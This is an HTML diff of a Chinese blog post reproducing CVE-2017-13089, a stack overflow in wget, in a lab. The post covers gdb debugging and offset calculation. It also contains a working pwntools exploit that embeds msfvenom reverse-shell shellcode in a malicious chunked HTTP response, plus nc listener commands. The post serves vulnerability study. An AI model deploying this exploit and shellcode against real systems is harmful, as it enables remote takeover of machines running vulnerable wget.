@@ -5,8 +5,6 @@
   <!-- SEO相关 -->
   
     
-      <meta name="robots" content="noindex,follow">
-    
   
   <!-- 渲染优化 -->
   <meta http-equiv='x-dns-prefetch-control' content='on' />
@@ -21,7 +19,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>Archive: 2021 - 虽然没什么用但还是想记下来</title>
+  <title>cve-2017-13089 wget栈溢出漏洞复现 - 虽然没什么用但还是想记下来</title>
   
 
   
@@ -56,7 +54,7 @@
 <body>
   
 
-<header id="l_header" class="l_header auto shadow blur " style='opacity: 0' >
+<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -307,7 +305,7 @@
     <div id="l_cover">
   
     
-        <div id="half" class='cover-wrapper  dock' style="display: ;">
+        <div id="full" class='cover-wrapper cve-2017-13089 dock' style="display: none;">
           
             <div class='cover-bg lazyload placeholder' data-bg="https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg"></div>
           
@@ -376,536 +374,204 @@
         
 
 <div class='l_main'>
-	
-		
-  <section class="post-list">
-    
-      
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/24/wget%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-        cve-2017-13089 wget栈溢出漏洞复现
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        环境搭建1、Ubuntu 16.04 64bit
-![DB091FB7-51AD-4B0E-8DF8-03702EEB212F](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DB091FB7-51AD-4B0E-8DF8-...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-24</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/24/wget%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
+  <article class="article post white-box reveal md shadow article-type-cve-2017-13089" id="cve-2017-13089" itemscope itemprop="blogPost">
   
 
+
+  
+  <div class="article-meta" id="top">
+    
+    
+    
+      <h1 class="title">
+        cve-2017-13089 wget栈溢出漏洞复现
+      </h1>
+      <div class='new-meta-box'>
+        
+          
+            
+<div class='new-meta-item author'>
+  <a class='author' href="/" rel="nofollow">
+    <img no-lazy src="">
+    <p>请设置文章作者</p>
+  </a>
 </div>
 
-          </div>
+          
         
-      
+          
+            
+
+          
         
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/16/%E4%BD%BF%E7%94%A8DNS%E5%BA%8F%E5%88%97%E5%AE%9A%E4%BD%8DAPT%E6%94%BB%E5%87%BB%E4%B8%AD%E5%8F%97%E6%84%9F%E6%9F%93%E7%9A%84%E4%B8%BB%E6%9C%BA/">
-        使用DNS序列定位APT攻击中受感染的主机
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
+          
+            <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Mar 24, 2021</p>
+  </a>
+</div>
+
+          
+        
+          
+            
+  <div class="new-meta-item browse leancloud">
+    <a class='notlink'>
       
-        Introduction1、列出了一些重大的经典的攻击
+      <div id="lc-pv" data-title="cve-2017-13089 wget栈溢出漏洞复现" data-path="/2021/03/24/wget%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+        <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+        <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+        次浏览
+      </div>
+    </a>
+  </div>
+
+
+          
+        
+      </div>
+    
+  </div>
+
+
+  
+  <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>1、<strong>Ubuntu 16.04 64bit</strong></p>
+<p>![DB091FB7-51AD-4B0E-8DF8-03702EEB212F](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DB091FB7-51AD-4B0E-8DF8-03702EEB212F.png)</p>
+<p>2、<strong>wget .19.1</strong></p>
+<h2 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h2><p>建立好poc文件之后，端口监听</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp <span class="number">9799</span> &lt; poc2</span><br></pre></td></tr></table></figure>
+
+<p>另一个窗口执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./wget <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9799</span></span><br></pre></td></tr></table></figure>
+
+<p>![67F82420-F331-4EBE-BDCA-9F8F4DEDDA10](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/67F82420-F331-4EBE-BDCA-9F8F4DEDDA10.png)</p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>代码结构大致如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http.c&#123;</span><br><span class="line">  ...</span><br><span class="line">  statcode == <span class="number">401</span>&#123;</span><br><span class="line">    ---&gt; skip_short_body(sock, contlen, chunked_transfer_encoding) ---&gt;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进skip_short_body函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">skip_short_body (<span class="keyword">int</span> fd, wgint contlen, <span class="keyword">bool</span> chunked)&#123;</span><br><span class="line">  </span><br><span class="line">  SKIP_SIZE = <span class="number">512</span>;</span><br><span class="line">  remaining_chunk_size = <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> dlbuf[SKIP_SIZE + <span class="number">1</span>]; <span class="comment">//定义一个字符数组</span></span><br><span class="line">  dlbuf[SKIP_SIZE] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  </span><br><span class="line">  ...</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">char</span> *line = fd_read_line (fd); <span class="comment">//首先获取到相应包的响应体的指针</span></span><br><span class="line">  remaining_chunk_size = strtol (line, &amp;<span class="built_in">endl</span>, <span class="number">16</span>); <span class="comment">//将line指向的值转换为整数值</span></span><br><span class="line">  </span><br><span class="line">  contlen = MIN (remaining_chunk_size, SKIP_SIZE);<span class="comment">//contlen表示真正的响应体的长度，这里两者取较小值</span></span><br><span class="line">  </span><br><span class="line">  ret = fd_read (fd, dlbuf, MIN (contlen, SKIP_SIZE), <span class="number">-1</span>); <span class="comment">//将fd指针指向的内容，复制到dlbuf中 ---&gt; fd_read</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>跟进fd_read函数，其在connect.c中。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd_read (<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> bufsize, <span class="keyword">double</span> timeout)</span><br><span class="line">  ---&gt; sock_read函数</span><br></pre></td></tr></table></figure>
+
+
+
+<p>sock_read()如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sock_read (<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf, <span class="keyword">int</span> bufsize)</span><br></pre></td></tr></table></figure>
+
+<p>此处触发栈溢出。</p>
+<h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gdb wget</span><br><span class="line"></span><br><span class="line"><span class="comment">#设置参数</span></span><br><span class="line">set args <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9799</span> </span><br><span class="line">  </span><br><span class="line"><span class="comment">#设置断点在某函数开头</span></span><br><span class="line">b skip_short_body</span><br><span class="line"><span class="comment">#设置断点在某函数末尾</span></span><br><span class="line">disass skip_short_body</span><br><span class="line">找到地址</span><br><span class="line">b *<span class="number">0x000000000041f18d</span></span><br><span class="line"></span><br><span class="line">r <span class="comment">#运行</span></span><br></pre></td></tr></table></figure>
+
+<p>同时另一个窗口</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lp <span class="number">9799</span> &lt; poc</span><br></pre></td></tr></table></figure>
+
+
+
+<p>![DBCF7AE8-B3EE-4889-BB2A-B2861A543A94](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DBCF7AE8-B3EE-4889-BB2A-B2861A543A94.png)</p>
+<p>strol函数，传递的参数如下：</p>
+<p>![DD01E276-05B9-4495-8A0D-5ED9A88988F2](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/DD01E276-05B9-4495-8A0D-5ED9A88988F2.png)</p>
+<p>调用fd_read的时候，往第二个参数0x7fffffffd140内写入传输到内容，即AAAA……</p>
+<p>![0560E40D-88C9-4F39-9107-0152E8020513](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/0560E40D-88C9-4F39-9107-0152E8020513.png)</p>
+<p>然后返回到skip_short_body函数。为了方便后续的利用，需要计算栈偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; distance <span class="number">0x7fffffffd140</span> $rbp+<span class="number">8</span></span><br><span class="line">0x7fffffffd140-&gt;0x7fffffffd378 is 0x238 bytes (0x47 words)</span><br><span class="line"></span><br><span class="line"><span class="number">0x238</span> = <span class="number">568</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>需要先关闭栈保护，然后重新编译。</p>
+<p>![E11F40C8-083E-48F6-B13D-8680D2C6B94B](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/E11F40C8-083E-48F6-B13D-8680D2C6B94B.png)</p>
+<p>生成shellcode，ifconfig查看ip，-f c表示是C语言格式的</p>
+<p>![image-20210326131337229](/Users/my/Library/Application Support/typora-user-images/image-20210326131337229.png)</p>
+<p>payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;HTTP/1.1 401 Not Authorized</span></span><br><span class="line"><span class="string">Content-Type: text/plain; charset=UTF-8</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-0xFFFFF000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">port = p64(<span class="number">6324</span>).replace(<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;&#x27;</span>)[::<span class="number">-1</span>]</span><br><span class="line">sc = <span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x18\xb4\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">payload += sc + (<span class="number">568</span>-len(sc))*<span class="string">&#x27;A&#x27;</span></span><br><span class="line"><span class="comment">#payload += &quot;\xd0\xd8\xff\xff\xff\x7f\x00\x00&quot;</span></span><br><span class="line">payload += p64(<span class="number">0x7fffffffd140</span>)</span><br><span class="line">payload += <span class="string">&quot;\n0\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;exp1&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#A窗口 监听端口</span></span><br><span class="line">nc -nvlp <span class="number">6324</span> &lt; exp1</span><br><span class="line"></span><br><span class="line"><span class="comment">#B窗口 调试</span></span><br><span class="line">set args <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6324</span></span><br><span class="line">b skip_short_body</span><br><span class="line">或</span><br><span class="line">b *<span class="number">0x000000000041f18d</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#C窗口 连接</span></span><br><span class="line">nc <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">6324</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>按照这个步骤执行，一直没成功，不知道是什么原因，从头再来执行一遍。</p>
+<p>(1)生成shellcode</p>
+<p>msf在kali中有，且ubuntu中安装比较麻烦，故不再安装。</p>
+<p>先msf进入，再输入如下语句生成sc。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; msfvenom -p linux/x64/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.112</span><span class="number">.2</span> LPORT=<span class="number">6324</span> -f c</span><br><span class="line"></span><br><span class="line">Payload size: <span class="number">74</span> bytes</span><br><span class="line">Final size of c file: <span class="number">335</span> bytes</span><br><span class="line">unsigned char buf[] = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x18\xb4\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>;</span><br><span class="line"></span><br><span class="line">msf5 &gt; msfvenom -p linux/x64/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.112</span><span class="number">.2</span> LPORT=<span class="number">6789</span> -f c</span><br><span class="line"></span><br><span class="line">Payload size: <span class="number">74</span> bytes</span><br><span class="line">Final size of c file: <span class="number">335</span> bytes</span><br><span class="line">unsigned char buf[] = </span><br><span class="line"><span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\xb9\x02\x00\x1a\x85\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如果改变端口的值，只有第二段有略微不同。自己采用6789端口，即第二段sc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;HTTP/1.1 401 Not Authorized</span></span><br><span class="line"><span class="string">Content-Type: text/plain; charset=UTF-8</span></span><br><span class="line"><span class="string">Transfer-Encoding: chunked</span></span><br><span class="line"><span class="string">Connection: keep-alive</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-0xFFFFF000</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sc = <span class="string">&quot;\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x1a\x85\xc0\xa8\x70\x02\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05&quot;</span></span><br><span class="line"></span><br><span class="line">payload += sc + (<span class="number">568</span>-len(sc))*<span class="string">&#x27;A&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0x7fffffffd140</span>)</span><br><span class="line">payload += <span class="string">&quot;\n0\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;zzz&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br></pre></td></tr></table></figure>
+
+<p>此处传入的返回地址可能是不准确的，调试一下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#A窗口 监听端口</span></span><br><span class="line">nc -nvlp <span class="number">6789</span> &lt; zzz</span><br><span class="line"></span><br><span class="line"><span class="comment">#B窗口 调试</span></span><br><span class="line">set args <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6789</span></span><br><span class="line">b skip_short_body</span><br><span class="line">b *<span class="number">0x000000000041f18d</span></span><br></pre></td></tr></table></figure>
+
+<p>此时写的地址变成了0xfd190，所以需要把上面的payload的返回地址改成0x190。</p>
+<p>需要纠正两个点</p>
+<p>利用过程主要分为两步，触发漏洞和反弹端口</p>
+<p>(1)触发漏洞：窗口A通过nc开启一个端口6788，B进行调试，连接到这个端口，触发漏洞，执行shellcode。</p>
+<p>(2)反弹shell，shellcode的作用是反弹shell，反弹的端口是在生成木马的时候指定的，此处设置的是6789，C窗口监听6789端口。</p>
+<p>代码如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#A</span></span><br><span class="line">nc -nvlp <span class="number">6788</span> &lt; zzz</span><br><span class="line"></span><br><span class="line"><span class="comment">#B</span></span><br><span class="line">gdb wget</span><br><span class="line">set args <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6788</span></span><br><span class="line">b *<span class="number">0x000000000041f18d</span></span><br><span class="line">r</span><br><span class="line"></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line">nc -nvlp <span class="number">6789</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行完shellcode之后，显示如下</p>
+<p>![A4AC9F7D-B4C3-461D-BDA7-70EFA2A17715](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/A4AC9F7D-B4C3-461D-BDA7-70EFA2A17715.png)</p>
+<p>在B窗口 disable 1，取消断点，然后c</p>
+<p>![B6F04B08-192A-4E7F-8BDC-5309C9E95614](/Users/my/Library/Containers/com.tencent.qq/Data/Library/Application Support/QQ/Users/1419145435/QQ/Temp.db/B6F04B08-192A-4E7F-8BDC-5309C9E95614.png)</p>
+<p>收获：</p>
+<p>1、自己基础太差，卡在那里是因为nc的用法、反弹shell 不清楚</p>
+<p>2、适当参考网上的文章，可能有不适用的地方甚至有错误</p>
+<p>3、勤能补拙！多看多花时间，也能理解！</p>
+<p>参考</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://www.gandalf.site/2019/01/cve-2017-13089wget.html">漏洞分析（一）CVE-2017-13089_wget栈溢出 by gandalf</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7394">CVE-2017-13089 wget 栈溢出漏洞复现 by h4lo</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/3rBfUnRiFoe-0w2C9JqwZw">CVE-2017-13089 wget栈溢出复现 by 雷神众测</a></p>
+</li>
+</ul>
+
+  
+  
+  
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/2021/03/16/%E4%BD%BF%E7%94%A8DNS%E5%BA%8F%E5%88%97%E5%AE%9A%E4%BD%8DAPT%E6%94%BB%E5%87%BB%E4%B8%AD%E5%8F%97%E6%84%9F%E6%9F%93%E7%9A%84%E4%B8%BB%E6%9C%BA/'>
+          <p class='title'>使用DNS序列定位APT攻击中受感染的主机<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>Introduction1、列出了一些重大的经典的攻击
 
 Aurora 
 
-参考 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/more-details-on-operation-aurora/
-
-Stuxnet
-
-震网
-2、APTs严重威胁着网络安全，可能会窃取用户的信息，造成损失。他们会把自己伪装成合法用户，逐渐提权，使得自己难...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-16</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/paper%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/">paper阅读笔记</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/16/%E4%BD%BF%E7%94%A8DNS%E5%BA%8F%E5%88%97%E5%AE%9A%E4%BD%8DAPT%E6%94%BB%E5%87%BB%E4%B8%AD%E5%8F%97%E6%84%9F%E6%9F%93%E7%9A%84%E4%B8%BB%E6%9C%BA/'>
-            Read More
-          </a>
-        </div>
+参考 https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mor...</p>
+        </a>
       
     </div>
   
+</article>
 
+
+  
+
+  <article class="post white-box reveal shadow" id="comments">
+    <p ct><i class='fas fa-comments'></i> 评论</p>
+    
+    <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
 </div>
 
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/06/%E6%81%B6%E6%84%8Furl%E4%BA%94/">
-        恶意url五
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        十一、卷积神经网络的方法实现准确且快速的URL钓鱼检测1、作者来自 西电、陕西省网络计算与安全技术重点实验室、西北工业大学、捷克斯托乔瓦理工大学、西里西亚理工大学。发表期刊是 Elsevier-computer network-2020年4月。
-2、本文的目的是检测钓鱼网站的URL地址，且只分析URL text。
-3、前人工作
-可以分为 基于list的 和 基于机器学习的。
-一个比较好的应用...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-06</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/06/%E6%81%B6%E6%84%8Furl%E4%BA%94/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/05/ssh%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/">
-        ssh登陆失败的解决方法
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        之前想设置ssh连接不断开，一通操作之后不能登陆了… 以下记录恢复过程。
-12my@192:~$ --&gt; ssh -p22 root@(ip)ssh: connect to host (ip) port 22: Connection refused
+  </article>
 
 
 
-1、更改服务器ssh配置
-​    依稀记得是在/etc/ssh/sshd_config中加了两条语句，现在尝试把它删掉。但是现在不...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-05</time>
-        
-          <span class="dot"></span>
-          <a class="category-link" href="/categories/%E6%9D%82%E8%AE%B0/">杂记</a>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/05/ssh%E7%99%BB%E9%99%86%E5%A4%B1%E8%B4%A5%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
-      <a href="/2021/03/02/latex%E6%8E%92%E7%89%88%E8%AE%B0%E5%BD%95/">
-        latex排版记录
-      </a>
-    </h2>
-  
-  <div class='md'>
-    
-      
-        前言：每个期刊都有自己的格式，最简便的方法是去网站上找到模板，直接套用即可。此文章记录的是对elsarticle模板的分析。
-#预定义格式
-如下
-1234\documentclass[review]&#123;elsarticle&#125;\usepackage&#123;lineno,hyperref&#125;\journal&#123;Journal of \LaTeX\ Templ...
-      
-    
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
-        
-        <time>2021-03-02</time>
-        
-      </div>
-      
-        <div>
-          <a class='readmore' href='/2021/03/02/latex%E6%8E%92%E7%89%88%E8%AE%B0%E5%BD%95/'>
-            Read More
-          </a>
-        </div>
-      
-    </div>
-  
-
-</div>
-
-          </div>
-        
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow">
-  
-  
-  
-  
-    
-    <h2 class="article-title" >
